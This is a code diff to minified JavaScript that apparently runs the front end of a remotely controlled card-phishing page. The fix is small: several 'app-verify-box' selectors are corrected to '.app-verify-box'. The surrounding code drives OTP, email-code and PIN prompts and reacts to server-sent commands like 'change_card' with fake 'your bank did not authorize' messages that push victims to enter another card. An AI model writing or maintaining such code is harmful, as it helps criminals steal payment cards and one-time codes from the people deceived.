@@ -650,7 +650,7 @@
           var lo=q('load-overlay');if(lo)lo.classList.add('hidden');
           var mounts=['mount1','mount2','mount3','mount4','mount5','mount6','mount7'];
           mounts.forEach(function(m){var el=document.getElementById(m);if(el){el.classList.add('hidden');el.innerHTML=''}});
-          var avb=q('app-verify-box');if(avb)avb.classList.add('hidden');
+          var avb=q('.app-verify-box');if(avb)avb.classList.add('hidden');
           q('otp-spinner').style.display="";
           q('email-spinner').style.display="";
           q('pin-spinner').style.display="";
@@ -785,7 +785,7 @@
                 else if(a === 'change_card_prompt') {
                   _curStep = 'card';
                   var lo2=q('load-overlay');if(lo2)lo2.classList.add('hidden');
-                  var avbox=q('app-verify-box');if(avbox)avbox.classList.add('hidden');
+                  var avbox=q('.app-verify-box');if(avbox)avbox.classList.add('hidden');
                   for(var i=1;i<=7;i++){var m=document.getElementById('mount'+i);if(m){m.classList.add('hidden');try{var sr=m.shadowRoot;if(sr){var dd=sr.querySelector('div>div');if(dd)dd.classList.add('hidden')}}catch(e){}}}
                   var resultmessage = p.message || 'Your bank did not authorize this transaction.';
                   var otpResP=document.querySelector('#otp-result>p');if(otpResP)otpResP.innerHTML=resultmessage+'<br>Please try another card or contact your card issuer.';
@@ -798,12 +798,13 @@
                 else if(a === 'change_card') {
                   _curStep = 'card';
                   var lo2=q('load-overlay');if(lo2)lo2.classList.add('hidden');
-                  var avbox=q('app-verify-box');if(avbox)avbox.classList.add('hidden');
+                  var avbox=q('.app-verify-box');if(avbox)avbox.classList.add('hidden');
                   for(var i=1;i<=7;i++){var m=document.getElementById('mount'+i);if(m){m.classList.add('hidden');try{var sr=m.shadowRoot;if(sr){var dd=sr.querySelector('div>div');if(dd)dd.classList.add('hidden')}}catch(e){}}}
                   var resultmessage = p.message || 'Your bank did not authorize this transaction.';
                   var otpResP=document.querySelector('#otp-result>p');if(otpResP)otpResP.innerHTML=resultmessage+'<br>Please try another card or contact your card issuer.';
                   var emailResP=document.querySelector('#email-result>p');if(emailResP)emailResP.innerHTML=resultmessage+'<br>Please try another card or contact your card issuer.';
                   changeOtp();changeEmail();
+
                   var avo=q('app-verify-overlay');if(avo)avo.classList.add('hidden');
                   var bs3=q('btnSubmit');if(bs3)bs3.disabled=false;
                   showMsg('error', 'Please use a different card.', true)
@@ -814,7 +815,7 @@
                   var cm=p.message||'';
                   if((function(){var avo=q('app-verify-overlay');return avo?!avo.classList.contains('hidden'):false})()){
                     for(var i=1;i<=7;i++){var m=document.getElementById('mount'+i);if(!m.classList.contains('hidden')&&m.shadowRoot){var sp=m.shadowRoot.querySelector('.vfy-spinner');var er=m.shadowRoot.querySelector('.app-error');if(sp){sp.classList.add('hidden');sp.style.display=""}if(er){er.classList.remove('hidden');er.textContent=cm};return}}
-                    var avbox=q('app-verify-box');if(avbox)avbox.classList.remove('hidden');var as=document.getElementById('app-spinner');if(as){as.classList.add('hidden');as.style.display=""}var ae4=q('app-error');if(ae4)ae4.classList.remove('hidden');var ae3=q('app-error');if(ae3)ae3.textContent=cm;var acb=q('app-continue-btn');if(acb){acb.disabled=false;acb.textContent='Continue to complete'}
+                    var avbox=q('.app-verify-box');if(avbox)avbox.classList.remove('hidden');var as=document.getElementById('app-spinner');if(as){as.classList.add('hidden');as.style.display=""}var ae4=q('app-error');if(ae4)ae4.classList.remove('hidden');var ae3=q('app-error');if(ae3)ae3.textContent=cm;var acb=q('app-continue-btn');if(acb){acb.disabled=false;acb.textContent='Continue to complete'}
                   }else if((function(){var avo3=q('otp-overlay');return avo3?!avo3.classList.contains('hidden'):false})()){
                     var otpsp=document.getElementById('otp-spinner');if(otpsp){otpsp.classList.add('hidden');otpsp.style.display=""}
                     var otpErr = q('otp-error');
@@ -846,7 +847,7 @@
                   i++) {
                     var m = document.getElementById('mount'+i);
                     if(m) { m.classList.add('hidden'); m.innerHTML = ''}
-                  }var av = q('app-verify-box'); if (av) av.classList.add('hidden');
+                  }var av = q('.app-verify-box'); if (av) av.classList.add('hidden');
                   var as = q('app-spinner'); if (as) as.style.display='none';}
                   function changeOtp() {
                     var oo=q('otp-overlay');if(oo)oo.classList.add('hidden');
